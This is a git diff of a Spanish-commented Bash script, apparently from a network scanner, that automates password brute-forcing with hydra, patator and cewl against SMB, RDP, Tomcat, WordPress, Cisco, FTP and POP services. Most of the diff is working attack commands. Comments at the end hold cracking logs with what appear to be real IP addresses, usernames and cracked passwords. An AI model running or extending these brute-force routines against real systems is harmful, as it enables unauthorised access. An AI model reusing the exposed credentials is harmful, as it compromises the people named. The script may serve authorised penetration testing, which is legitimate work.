@@ -43,6 +43,7 @@ done
 ENTIDAD=${ENTIDAD:=NULL}
 DICTIONARY=${DICTIONARY:=NULL}
 TYPE=${TYPE:=NULL}
+tomcat_passwrods_combo="/usr/share/lanscanner/tomcat-passwds.txt"
 
 if [[ ${ENTIDAD} = NULL  && ${DICTIONARY} = NULL  ]];then 
 
@@ -111,11 +112,10 @@ fi
 ### Windows
 if [ -f servicios/Windows.txt ]
 then
-	#interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l administrador -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
-	#interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l administrador -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	echo -e "\n\t $OKBLUE Testing windows auth  $RESET"	  	
 	
-	interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l administrator -P top.txt -t 1 _target_  smb' >> logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
-	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l administrator -P top.txt -t 1 _target_  smb >> logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	interlace -tL servicios/Windows.txt -threads 10 -c "echo  '\n hydra -l administrator -P top.txt -t 1 _target_  smb' >> logs/cracking/_target__windows_passwordAdivinado.txt 2>/dev/null" --silent
+	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l administrator -P top.txt -t 1 _target_  smb >> logs/cracking/_target__windows_passwordAdivinado.txt 2>/dev/null" --silent
 	
 	
 	#interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l soporte -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
@@ -134,7 +134,7 @@ if [ -f servicios/Windows.txt ]
 then
 		
 	for ip in $(cat servicios/Windows.txt); do			
-		egrep --color=never -i 'login:' logs/cracking/"$ip"_445_passwordAdivinadoWin.txt | tee -a .vulnerabilidades/"$ip"_445_passwordAdivinadoWin.txt
+		egrep --color=never -i 'login:' logs/cracking/"$ip"_windows_passwordAdivinado.txt | tee -a .vulnerabilidades/"$ip"_windows_passwordAdivinado.txt
 		#https://github.com/m4ll0k/SMBrute (shared)											
 	 done	
 	 insert_data
@@ -165,31 +165,10 @@ if [ -f servicios/rdp.txt ]; then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "\n\t $OKBLUE Encontre servicios de RDP expuestos en $ip:$port $RESET"	  
-
-		# user = administrador
-		# patator rdp_login host=$ip user=administrador password=FILE0 0=top.txt  -l logs/cracking/rdp 
-		# logFile=`grep OK logs/cracking/rdp/* | head -1| cut -d ":" -f1`		
-		# echo "logFile $logFile"
-		# if [ -z "$logFile" ]; then
-		# 	echo "Upps no se encontro passwords"
-		# else
-		# 	egrep -iq "OK" $logFile 
-		# 	greprc=$?
-		# 	if [[ $greprc -eq 0 ]] ; then			
-		# 		echo -e "\t[i] Password encontrado"
-		# 		# 14:36:32 patator    INFO - 0     2      1.942 | Cndc2021                           |   123 | OK
-		# 		password=`head -1 $logFile | cut -d " " -f 4 | cut -d : -f2`
-		# 		cp $logFile logs/cracking/"$ip"_"$port"_rdpPass.txt 2>/dev/null
-		# 		echo "$line (Usuario:administrator Password:$password)" >> .vulnerabilidades/"$ip"_"$port"_rdpPass.txt								
-		# 	fi
-		# fi
-		# rm logs/cracking/rdp/* # borrar logs
-
-
 		
 
 		# user = "nombre entidad"
-		# patator rdp_login host=$ip user=$ENTIDAD password=FILE0 0=top.txt -l logs/cracking/rdp2 
+		# patator.py rdp_login host=$ip user=$ENTIDAD password=FILE0 0=top.txt -l logs/cracking/rdp2 
 		# logFile=`grep OK logs/cracking/rdp2/* | head -1| cut -d ":" -f1`		
 
 		# if [ -z "$logFile" ]; then
@@ -199,7 +178,7 @@ if [ -f servicios/rdp.txt ]; then
 		# 	greprc=$?
 		# 	if [[ $greprc -eq 0 ]] ; then			
 		# 		echo -e "\t[i] Password encontrado"
-		# 		# 14:36:32 patator    INFO - 0     2      1.942 | Cndc2021                           |   123 | OK
+		# 		# 14:36:32 patator.py    INFO - 0     2      1.942 | Cndc2021                           |   123 | OK
 		# 		password=`head -1 $logFile | cut -d " " -f 4 | cut -d : -f2`
 		# 		cp $logFile logs/cracking/"$ip"_"$port"_rdpPass.txt #2>/dev/null
 		# 		echo "$line (Usuario:$ENTIDAD Password:$password)" >> .vulnerabilidades/"$ip"_"$port"_rdpPass.txt								
@@ -210,8 +189,9 @@ if [ -f servicios/rdp.txt ]; then
 		
 
 		# user = administrator
-		patator rdp_login host=$ip user=administrator password=FILE0 0=top.txt  -l logs/cracking/rdp3 2>/dev/null
-		logFile=`grep OK logs/cracking/rdp3/* | head -1| cut -d ":" -f1`				
+		mkdir -p logs/cracking/rdp3/$ip
+		patator.py rdp_login host=$ip user=administrator password=FILE0 0=top.txt  -l logs/cracking/rdp3/$ip 2>/dev/null
+		logFile=`grep OK logs/cracking/rdp3/$ip/* | head -1| cut -d ":" -f1`				
 		if [ -z "$logFile" ]; then
 			echo "Upps no se encontro passwords"
 		else
@@ -220,13 +200,13 @@ if [ -f servicios/rdp.txt ]; then
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then			
 				echo -e "\t[i] Password encontrado"
-				# 14:36:32 patator    INFO - 0     2      1.942 | Cndc2021                           |   123 | OK
+				# 14:36:32 patator.py    INFO - 0     2      1.942 | Cndc2021                           |   123 | OK
 				password=`head -1 $logFile | cut -d " " -f 4 | cut -d : -f2`
 				echo "$line (Usuario:administrator Password:$password)" >> .vulnerabilidades/"$ip"_"$port"_rdpPass.txt								
 				cp $logFile logs/cracking/"$ip"_"$port"_rdpPass.txt 2>/dev/null
 			fi
 		fi
-		rm logs/cracking/rdp3/* # borrar logs									
+		#rm logs/cracking/rdp3/* # borrar logs									
 	 done	
 	 insert_data
 
@@ -244,18 +224,22 @@ then
 		
 		ip_port_path=`echo $line | cut -d ";" -f 1` #https://www.sanmateo.com.bo:443/wp-login.php
 		url=`echo $ip_port_path | sed 's/wp-login.php//'` # https://www.sanmateo.com.bo:443
-		
-		cewl -w cewl-passwords.txt -e -a $url
-		cat toptxt cewl-passwords.txt | sort | uniq > top-web.txt
-
 		fingerprint=`echo $line | cut -d ";" -f 2`
-		echo -e "\n\t########### $ip_port_path #######"
-		
+	
 		ip_port=`echo $ip_port_path | cut -d "/" -f 3` # 190.129.69.107:80			
+		proto_ip_port=`echo $ip_port_path | cut -d "/" -f 1-3` # 190.129.69.107:80			
 		ip=`echo $ip_port | cut -d ":" -f 1`
 		port=`echo $ip_port | cut -d ":" -f 2`
 		path="/"`echo $ip_port_path | cut -d "/" -f 4` # /wp-login.php
 		path=`echo $path | sed 's/wp-login.php//'` #borrar wp-login.php y dejar path como / o /web/
+
+		
+		echo -e "\n\t########### $ip_port #######"
+				
+		echo -e "\n\t########### extract passwords from $proto_ip_port #######"
+		cewl -w cewl-passwords.txt -e -a $proto_ip_port
+		cat top.txt cewl-passwords.txt | sort | uniq > top-web.txt
+
 #			echo "webData.pl -t $ip -d $path -p $port -e todo -l /dev/null -r 4 "			
 		echo ""
 		if [[ $fingerprint = *"wordpress"* ]]; then
@@ -357,61 +341,53 @@ then
 					
 		if [[ $fingerprint = *"tomcat"* ]]; then
 			echo -e "\t[+] Tomcat identificado"							
-			echo "patator http_fuzz method=GET url=$ip_port_path  user_pass=tomcat:tomcat -e user_pass:b64 --threads=1" > logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt	
-			patator http_fuzz method=GET url=$ip_port_path  user_pass=tomcat:tomcat -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt	
-			egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
+			echo "patator.py http_fuzz url=$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwrods_combo >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt	" > logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt 
+
+			echo -e "\t\t[+] Testing common passwords"	
+			patator.py http_fuzz url=$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwrods_combo >> logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt 2 >> logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt	
+			#patator.py http_fuzz url=$ip_port_path user_pass=tomcat:tomcat -e user_pass:b64 --threads=1 
+			egrep -iq "200 OK" logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then			
 				echo -e "\t[i] Password encontrado"
-				# 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
+				# 12:56:35 patator.py    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
 				#password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`										
-				echo "[Tomcat] $ip_port_path (Usuario:tomcat Password:tomcat)" > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt								
+				echo "[Tomcat] $ip_port_path (Usuario:xxx Password:xxx)" > .vulnerabilidades/"$ip"_tomcat_passwordAdivinadoServ.txt								
+			else
+				echo -e "\t\t[+] Bruteforcing passwords (user=tomcat)"	
+				echo "patator.py http_fuzz method=GET url=$line user_pass=tomcat:FILE0 0=top-web.txt -e user_pass:b64 --threads=1" >> logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt 				
+				patator.py http_fuzz method=GET url=$line user_pass=admin:FILE0 0=top-web.txt -e user_pass:b64 --threads=1 > logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt			
+				egrep -iq "200 OK" logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt
+				greprc=$?
+				if [[ $greprc -eq 0 ]] ; then			
+					echo -e "\t[i] Password encontrado"
+					# 12:56:35 patator.py    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
+					password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
+					echo "$line (Usuario:admin Password:$password)" > .vulnerabilidades/"$ip"_"$port"_passTomcat.txt								
+				fi
 			fi
 			
-			echo "patator http_fuzz method=GET url=$ip_port_path  user_pass=root:root -e user_pass:b64 --threads=1" > logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
-			patator http_fuzz method=GET url=$ip_port_path  user_pass=root:root -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
-			egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
-			greprc=$?
-			if [[ $greprc -eq 0 ]] ; then			
-				echo -e "\t[i] Password encontrado"
-				# 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
-				#password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`										
-				echo "[Tomcat] $ip_port_path (Usuario:root Password:root)" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt								
-			fi
 			
-			#patator http_fuzz method=GET url=$line user_pass=tomcat:FILE0 0=top-web.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passTomcat.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat.txt
-			#si encontro el password											
-	
-			#patator http_fuzz method=GET url=$line user_pass=admin:FILE0 0=top-web.txt -e user_pass:b64 --threads=1 > logs/cracking/"$ip"_"$port"_passTomcat1.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat1.txt				
-			#si encontro el password
-			#egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passTomcat1.txt
-			#greprc=$?
-			#if [[ $greprc -eq 0 ]] ; then			
-				#echo -e "\t[i] Password encontrado"
-				## 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
-				#password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
-				#echo "$line (Usuario:admin Password:$password)" > .vulnerabilidades/"$ip"_"$port"_passTomcat.txt								
-			#fi
 											
 			
-			#patator http_fuzz method=GET url=$line user_pass=manager:FILE0 0=top-web.txt -e user_pass:b64 --threads=1 > logs/cracking/"$ip"_"$port"_passTomcat2.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat2.txt
+			#patator.py http_fuzz method=GET url=$line user_pass=manager:FILE0 0=top-web.txt -e user_pass:b64 --threads=1 > logs/cracking/"$ip"_"$port"_passTomcat2.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat2.txt
 			#si encontro el password
 #				egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passTomcat2.txt
 			#greprc=$?
 			#if [[ $greprc -eq 0 ]] ; then			
 				#echo -e "\t[i] Password encontrado"
-				## 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
+				## 12:56:35 patator.py    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
 				#password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
 				#echo "$line (Usuario:manager Password:$password)" > .vulnerabilidades/"$ip"_"$port"_passTomcat.txt								
 			#fi
 			
-			#patator http_fuzz method=GET url=$line user_pass=root:FILE0 0=top-web.txt -e user_pass:b64 --threads=1 > logs/cracking/"$ip"_"$port"_passTomcat3.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat3.txt
+			#patator.py http_fuzz method=GET url=$line user_pass=root:FILE0 0=top-web.txt -e user_pass:b64 --threads=1 > logs/cracking/"$ip"_"$port"_passTomcat3.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat3.txt
 			#si encontro el password
 			#egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passTomcat3.txt
 			#greprc=$?
 			#if [[ $greprc -eq 0 ]] ; then			
 				#echo -e "\t[i] Password encontrado"
-				## 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
+				## 12:56:35 patator.py    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
 				#password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
 				#echo "$line (Usuario:root Password:$password)" > .vulnerabilidades/"$ip"_"$port"_passTomcat.txt								
 			#fi			
@@ -432,8 +408,8 @@ then
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "[+] Probando $ip"
-			echo "patator http_fuzz method=GET url=\"http://$ip/\" user_pass=cisco:FILE0 0=top.txt -e user_pass:b64 --threads=1" >> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt
-			patator http_fuzz method=GET url="http://$ip/" user_pass=cisco:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt
+			echo "patator.py http_fuzz method=GET url=\"http://$ip/\" user_pass=cisco:FILE0 0=top.txt -e user_pass:b64 --threads=1" >> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt
+			patator.py http_fuzz method=GET url="http://$ip/" user_pass=cisco:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt
 			respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_80_passwordAdivinadoServ.txt`
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then
@@ -500,7 +476,7 @@ then
 			port=`echo $line | cut -d "/" -f 3| cut -d ":" -f2`	
 			
 			#probar con usuario admin
-			patator http_fuzz method=GET url="$line" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
+			patator.py http_fuzz method=GET url="$line" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
 			respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt`
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then
@@ -508,7 +484,7 @@ then
 			fi	
 			
 			#probar con usuario root
-			patator http_fuzz method=GET url="$line" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
+			patator.py http_fuzz method=GET url="$line" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
 			respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt`
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then
@@ -521,7 +497,7 @@ then
 			port=`echo $line | cut -f2 -d":"`
 			if [[ ${port} == *"443"*  ]];then 	
 				#probar con usuario admin
-				patator http_fuzz method=GET url="https://$ip/" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
+				patator.py http_fuzz method=GET url="https://$ip/" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
 				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt`
 				greprc=$?
 				if [[ $greprc -eq 0 ]] ; then
@@ -529,7 +505,7 @@ then
 				fi	
 			
 				#probar con usuario root
-				patator http_fuzz method=GET url="http://$ip/" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
+				patator.py http_fuzz method=GET url="http://$ip/" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
 				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt`
 				greprc=$?
 				if [[ $greprc -eq 0 ]] ; then
@@ -832,26 +808,26 @@ then
 	######## revisar si no es impresora #####
 	#banner ftp
 	egrep -iq "Printer|JetDirect|LaserJet|KONICA|MULTI-ENVIRONMENT|Xerox" .banners2/"$ip"_21.txt
-	noImpresora21=$?
+	noImpresora_port21=$?
 	
 	#banner telnet						
-	noImpresora23=1		
+	noImpresora_port23=1		
 	if [ -f .banners2/"$ip"_23.txt ] 
 	then				
 		egrep -iq "Printer|JetDirect|LaserJet|KONICA|MULTI-ENVIRONMENT|Xerox" .banners2/"$ip"_23.txt 2>/dev/null
-		noImpresora23=$?
+		noImpresora_port23=$?
 	fi
 	
 	#banner web
-	noImpresora80=1		
+	noImpresora_port80=1		
 	if [ -f .enumeracion2/"$ip"_80_webData.txt ] 
 	then	
 		egrep -iq "Printer|JetDirect|LaserJet|KONICA|MULTI-ENVIRONMENT|Xerox" .enumeracion2/"$ip"_80_webData.txt 2>/dev/null
-		noImpresora80=$?
+		noImpresora_port80=$?
 	fi
 			
-	echo "noImpresora21 $noImpresora21 noImpresora80 $noImpresora80 noImpresora23 $noImpresora23"
-	if [[ $noImpresora21 -eq 1 && $noImpresora80 -eq 1 && $noImpresora23 -eq 1 ]] ; then			
+	echo "noImpresora_port21 $noImpresora_port21 noImpresora_port80 $noImpresora_port80 noImpresora_port23 $noImpresora_port23"
+	if [[ $noImpresora_port21 -eq 1 && $noImpresora_port80 -eq 1 && $noImpresora_port23 -eq 1 ]] ; then			
 		echo -e "[+] Probando $ip"		
 		
 		#echo -e "\n medusa -e n -u admin -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
@@ -932,7 +908,7 @@ then
 			cat passwords2.txt passwords3.txt top.txt| sort | uniq > passwords.txt			
 			username=`tail -1 passwords2.txt` # dtorres
 			echo -e "\n\t[+] username $username"			
-			patator pop_login host=$ip user=$username password=FILE0 0=passwords.txt >> logs/cracking/"$ip"_pop-$username.txt 2>> logs/cracking/"$ip"_pop-$username.txt		
+			patator.py pop_login host=$ip user=$username password=FILE0 0=passwords.txt >> logs/cracking/"$ip"_pop-$username.txt 2>> logs/cracking/"$ip"_pop-$username.txt		
 			grep --color=never messages logs/cracking/"$ip"_pop-$username.txt >> .vulnerabilidades/"$ip"_pop_passwordAdivinadoServ.txt
 			echo ""					
 			rm passwords.txt passwords2.txt passwords3.txt			
@@ -969,7 +945,7 @@ then
 			cat passwords2.txt passwords3.txt top.txt| sort | uniq > passwords.txt			
 			username=`tail -1 passwords2.txt` # dtorres
 			echo -e "\n\t[+] username $username"			
-			patator pop_passd host=$ip user=$username password=FILE0 0=passwords.txt >> logs/cracking/"$ip"_pop3pw-$username.txt 2>> logs/cracking/"$ip"_pop3pw-$username.txt		
+			patator.py pop_passd host=$ip user=$username password=FILE0 0=passwords.txt >> logs/cracking/"$ip"_pop3pw-$username.txt 2>> logs/cracking/"$ip"_pop3pw-$username.txt		
 			grep --color=never "new password " logs/cracking/"$ip"_pop3pw-$username.txt >> .vulnerabilidades/"$ip"_pop3pw_passwordAdivinadoServ.txt
 			echo ""					
 			rm passwords.txt passwords2.txt passwords3.txt			
@@ -1029,17 +1005,17 @@ then
 fi
 	
 
-#patator pop_login host=181.115.239.243 user=msanti password='Bichito$9'
-#17:20:24 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-10-22 17:20 EDT
-#17:20:24 patator    INFO -                                                                              
-#17:20:24 patator    INFO - code  size   time | candidate                          |   num | mesg
-#17:20:24 patator    INFO - -----------------------------------------------------------------------------
-#17:20:25 patator    INFO - +OK   32    0.094 |                                    |     1 | 3076 messages (263203895 octets)
+#patator.py pop_login host=181.115.239.243 user=msanti password='Bichito$9'
+#17:20:24 patator.py    INFO - Starting patator.py v0.6 (http://code.google.com/p/patator.py/) at 2018-10-22 17:20 EDT
+#17:20:24 patator.py    INFO -                                                                              
+#17:20:24 patator.py    INFO - code  size   time | candidate                          |   num | mesg
+#17:20:24 patator.py    INFO - -----------------------------------------------------------------------------
+#17:20:25 patator.py    INFO - +OK   32    0.094 |                                    |     1 | 3076 messages (263203895 octets)
 
 
-#patator pop_passd host=190.129.11.29 user=jaguilar password=jhashy275
-#16:40:34 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-10-22 16:40 EDT
-#16:40:34 patator    INFO -                                                                              
-##16:40:34 patator    INFO - code  size   time | candidate                          |   num | mesg
-#16:40:34 patator    INFO - -----------------------------------------------------------------------------
-#16:40:34 patator    INFO - 200   25    0.127 |                                    |     1 | Your new password please
+#patator.py pop_passd host=190.129.11.29 user=jaguilar password=jhashy275
+#16:40:34 patator.py    INFO - Starting patator.py v0.6 (http://code.google.com/p/patator.py/) at 2018-10-22 16:40 EDT
+#16:40:34 patator.py    INFO -                                                                              
+##16:40:34 patator.py    INFO - code  size   time | candidate                          |   num | mesg
+#16:40:34 patator.py    INFO - -----------------------------------------------------------------------------
+#16:40:34 patator.py    INFO - 200   25    0.127 |                                    |     1 | Your new password please
